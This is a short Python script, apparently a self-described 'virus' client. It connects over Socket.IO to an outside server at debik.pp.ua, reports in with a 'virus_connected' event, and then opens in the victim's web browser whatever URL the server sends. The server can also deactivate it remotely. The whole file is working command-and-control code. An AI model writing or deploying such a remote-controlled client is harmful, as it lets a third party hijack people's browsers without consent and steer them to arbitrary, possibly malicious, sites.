try:
    import time
    time.sleep(5)

    import socketio
    import webbrowser
    import sys

    sio = socketio.Client()

    @sio.on('connect')
    def connect():
        sio.emit('virus_connected')

    @sio.on('open_url')
    def open_url(data):
        url = data['url']
        print(f'url : {url}')
        webbrowser.open(url)
        #webbrowser.get(using='opera').open_new_tab(url) # DEVELOPMENT VERSION

    @sio.on('deactivate')
    def deactivate():
        print('DEACTIVATING')
        sio.emit('confirm_deactivate')

    @sio.on('finish_deactivating')
    def finish():
        time.sleep(0.5)
        sio.disconnect()
        time.sleep(0.5)
        sys.exit(0)

    @sio.on('ping')
    def ping():
        sio.emit('pong')
        time.sleep(0.1)

    try:    
        sio.connect('https://debik.pp.ua')
    except ConnectionError:
        sio.connect('http://debik.pp.ua')
except BaseException as e:
    print(e)
    time.sleep(7)
else:
    print('Connected to server')